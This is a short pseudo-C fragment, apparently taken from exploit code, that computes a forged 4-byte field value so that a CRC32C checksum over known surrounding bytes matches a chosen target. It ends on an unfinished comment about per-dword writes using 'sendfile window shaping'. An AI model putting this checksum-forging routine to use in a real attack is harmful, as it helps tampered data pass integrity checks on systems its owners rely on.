// Symbolic meet-in-the-middle for a controllable 4-byte field in a CRC32C input
// Inputs: known_prefix (header bytes before field), known_suffix (after field plus window[0:28])
// target_value: desired 4-byte CRC output
// Returns: forged field value

uint32_t solve_crc_mitm(bytes known_prefix, bytes known_suffix, uint32_t target_value) {
    uint32_t state_before = crc32c(known_prefix);
    uint32_t rev = reverse_crc32c(target_value, known_suffix);

    // Build forward table for upper 16 bits of field
    map table;
    for (uint32_t hi = 0; hi <= 0xffff; hi++) {
        uint32_t s = state_before;
        s = crc32c_byte(s, (hi >> 8) & 0xff);
        s = crc32c_byte(s, hi & 0xff);
        table[s] = hi;
    }

    // Enumerate lower 16 bits and reverse-match
    for (uint32_t lo = 0; lo <= 0xffff; lo++) {
        uint32_t candidate = reverse_crc32c_2bytes(rev, lo);
        if (table.contains(candidate)) {
            uint32_t hi = table[candidate];
            return (hi << 16) | lo;
        }
    }
    return 0; // not found (should not happen for valid inputs)
}

// Per-dword write using sendfile window shaping
